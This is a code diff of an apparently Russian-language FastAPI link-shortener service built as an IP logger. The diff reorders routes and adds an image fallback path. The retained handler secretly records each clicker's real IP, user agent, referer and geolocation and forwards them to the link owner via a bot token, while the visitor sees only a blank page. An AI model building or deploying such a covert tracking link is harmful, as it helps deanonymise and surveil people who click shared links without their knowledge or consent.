@@ -159,31 +159,9 @@ async def create_link(owner_id: int, token: str = ""):
     return {"short_id": short_id, "url": f"https://br-v2.online/{short_id}"}
 
 
-@app.get("/{short_id}")
-async def handle_log(short_id: str, request: Request):
-    """Обрабатывает переход по ссылке."""
-    owner_data = _links.get(short_id)
-    owner_id = owner_data[0] if owner_data else None
-    bot_token = owner_data[1] if owner_data else ""
-
-    # Получаем реальный IP (учитываем прокси/CDN)
-    forwarded = request.headers.get("X-Forwarded-For")
-    if forwarded:
-        ip = forwarded.split(",")[0].strip()
-    else:
-        ip = request.client.host
-
-    ua = request.headers.get("User-Agent", "—")
-    referer = request.headers.get("Referer", "—")
-
-    print(f"[LOGGER] Переход: /{short_id} | IP: {ip} | UA: {ua[:60]}", flush=True)
-
-    if owner_id:
-        ip_info = await _get_ip_info(ip)
-        asyncio.ensure_future(_notify_owner(owner_id, short_id, ip, ua, referer, ip_info, bot_token))
-
-    # Возвращаем пустую страницу
-    return HTMLResponse(content="", status_code=200)
+@app.get("/")
+async def root():
+    return HTMLResponse(content="", status_code=404)
 
 
 @app.get("/manual")
@@ -210,15 +188,38 @@ async def manual_page():
 @app.get("/manual.png")
 async def manual_image():
     """Отдаёт картинку мануала."""
-    img_path = os.path.join(os.path.dirname(__file__), "static", "manual.png")
+    img_path = "/root/BR/static/manual.png"
     if os.path.exists(img_path):
         return FileResponse(img_path, media_type="image/png")
+    img_path2 = os.path.join(os.path.abspath(os.path.dirname(__file__) or "."), "static", "manual.png")
+    if os.path.exists(img_path2):
+        return FileResponse(img_path2, media_type="image/png")
     return HTMLResponse(content="Not found", status_code=404)
 
 
-@app.get("/")
-async def root():
-    return HTMLResponse(content="", status_code=404)
+@app.get("/{short_id}")
+async def handle_log(short_id: str, request: Request):
+    """Обрабатывает переход по ссылке."""
+    owner_data = _links.get(short_id)
+    owner_id = owner_data[0] if owner_data else None
+    bot_token = owner_data[1] if owner_data else ""
+
+    forwarded = request.headers.get("X-Forwarded-For")
+    if forwarded:
+        ip = forwarded.split(",")[0].strip()
+    else:
+        ip = request.client.host
+
+    ua = request.headers.get("User-Agent", "—")
+    referer = request.headers.get("Referer", "—")
+
+    print(f"[LOGGER] Переход: /{short_id} | IP: {ip} | UA: {ua[:60]}", flush=True)
+
+    if owner_id:
+        ip_info = await _get_ip_info(ip)
+        asyncio.ensure_future(_notify_owner(owner_id, short_id, ip, ua, referer, ip_info, bot_token))
+
+    return HTMLResponse(content="", status_code=200)
 
 
 # ─── Запуск ───────────────────────────────────────────────────────────────────
